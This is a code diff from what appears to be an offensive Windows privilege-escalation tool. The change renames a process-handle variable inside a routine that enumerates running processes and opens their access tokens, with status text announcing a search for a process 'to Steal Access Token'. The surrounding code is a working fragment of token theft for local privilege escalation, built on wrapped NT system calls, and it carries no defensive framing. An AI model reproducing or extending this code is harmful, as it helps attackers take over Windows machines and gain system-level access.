@@ -7,7 +7,7 @@
 HANDLE hDupPriToken = 0xcccccccccccccccc;
 HANDLE hDupImpToken = 0xcccccccccccccccc;
 HANDLE hToken = 0xcccccccccccccccc;
-HANDLE hSysProcess = 0xcccccccccccccccc;
+HANDLE hTokenProcess = 0xcccccccccccccccc;
 
 void LocalPrivilegeErrorHandler() {
     setlocale(LC_ALL, "");
@@ -188,16 +188,16 @@ void SFLocalPrivilege() {
     PSYSTEM_PROCESS_INFORMATION processInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
     SFPrintStatus("Searching for a Proper Process to Steal Access Token.", "正在寻找合适的进程进行访问令牌窃取");
     while (1) {
-        hSysProcess = 0xcccccccccccccccc;
+        hTokenProcess = 0xcccccccccccccccc;
         OBJECT_ATTRIBUTES objectAttributes;
         CLIENT_ID clientId;
         clientId.UniqueProcess = processInfo->UniqueProcessId;
         clientId.UniqueThread = NULL;
         InitializeObjectAttributes(&objectAttributes, NULL, 0, NULL, NULL);
-        status = SFNtOpenProcess(&hSysProcess, MAXIMUM_ALLOWED, &objectAttributes, &clientId);
-        if (hSysProcess != 0xcccccccccccccccc && hSysProcess != 0) {
+        status = SFNtOpenProcess(&hTokenProcess, MAXIMUM_ALLOWED, &objectAttributes, &clientId);
+        if (hTokenProcess != 0xcccccccccccccccc && hTokenProcess != 0) {
             hToken = 0xcccccccccccccccc;
-            status = SFNtOpenProcessToken(hSysProcess, MAXIMUM_ALLOWED, &hToken);
+            status = SFNtOpenProcessToken(hTokenProcess, MAXIMUM_ALLOWED, &hToken);
             if (hToken != 0xcccccccccccccccc && hToken != 0) {
                 ULONG returnLength;
                 PTOKEN_USER tokenUser;
@@ -254,7 +254,7 @@ void SFLocalPrivilege() {
                     free(tokenUser);
                     SFNtClose(hToken);
                 }
-                SFNtClose(hSysProcess);
+                SFNtClose(hTokenProcess);
             }
             if (processInfo->NextEntryOffset == 0)
                 break;
